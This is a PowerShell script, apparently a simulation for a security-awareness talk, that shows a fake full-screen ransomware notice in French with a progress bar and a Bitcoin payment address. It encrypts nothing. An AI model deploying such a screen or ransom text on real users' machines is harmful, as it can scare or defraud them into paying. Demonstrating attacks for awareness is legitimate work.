###################
#    CyberAttackSimulation for CyberTalk
#    Copyright (C) 2025  CyberAttackSimulation

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

# powershell -ExecutionPolicy Bypass .\ransom.ps1

$OutputEncoding = [System.Text.Encoding]::UTF8

Add-Type -AssemblyName PresentationFramework

$window = New-Object System.Windows.Window
$window.WindowStyle = 'None'
$window.WindowState = 'Maximized'
$window.Background = 'Black'
$window.Topmost = $true
$window.ResizeMode = 'NoResize'
$window.ShowInTaskbar = $false

$stackPanel = New-Object System.Windows.Controls.StackPanel
$stackPanel.Orientation = "Vertical"
$stackPanel.Margin = '20'

$textBlock = New-Object System.Windows.Controls.TextBlock
$textBlock.Foreground = 'Red'
$textBlock.FontSize = 28
$textBlock.FontWeight = 'Bold'
$textBlock.TextWrapping = 'Wrap'
$textBlock.TextAlignment = 'Left'
$textBlock.HorizontalAlignment = 'Left'
$textBlock.VerticalAlignment = 'Top'
$textBlock.Margin = '0,0,0,50'
$stackPanel.Children.Add($textBlock)

$progressBar = New-Object System.Windows.Controls.ProgressBar
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$progressBar.Width = 800
$progressBar.Height = 30
$progressBar.Foreground = 'Red'
$progressBar.Background = 'DarkRed'
$stackPanel.Children.Add($progressBar)

$window.Content = $stackPanel

function Get-RandomData($length) {
    -join ((48..122) | Where-Object {$_ -match '[0-9a-zA-Z]'} | Get-Random -Count $length | ForEach-Object {[char]$_})
}

$script:progress = 0

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromMilliseconds(100)
$timer.Add_Tick({
    $script:progress += 1
    if ($script:progress -le 100) {
        $progressBar.Value = $script:progress
        $randomData = (1..5 | ForEach-Object { Get-RandomData -length 50 }) -join "`n"
        $textBlock.Text = @"
=======================
! ATTENTION ! VOS FICHIERS SONT CHIFFRÉS !
Progression : $script:progress%
=======================
Pour les récupérer, vous devez payer la rançon !
Instructions : envoyez 1 Bitcoin à l'adresse 3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG
=======================

$randomData
"@
    } else {
        $progressBar.Value = 100
        $textBlock.Text = @"
=======================
TOUS VOS FICHIERS SONT MAINTENANT INACCESSIBLES
=======================
Pour les récupérer, vous devez payer la rançon !
Instructions : envoyez du Bitcoin à l'adresse 3LU8wRu4ZnXP4UM8Yo6kkTiGHM9BubgyiG
"@
        $timer.Stop()
    }
})

$timer.Start()
$window.ShowDialog()
